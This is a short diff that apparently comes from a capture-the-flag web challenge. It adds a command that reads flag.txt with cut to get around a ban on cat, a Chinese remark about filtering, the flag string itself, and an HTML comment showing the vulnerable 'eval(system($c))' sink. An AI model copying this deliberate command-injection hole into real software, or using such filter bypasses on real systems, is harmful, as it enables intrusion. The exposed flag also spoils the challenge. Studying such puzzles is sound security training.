@@ -1,0 +1,6 @@
+cut -f -10000 flag.txt
+POST[a] 这次我们玩过滤好了。flag{WOw_Cut_4Nd_C4t_lo0kS_Sh49e}
+
+<!--
+	eval(system($c));//read flag.txt But no cat!！！
+-->
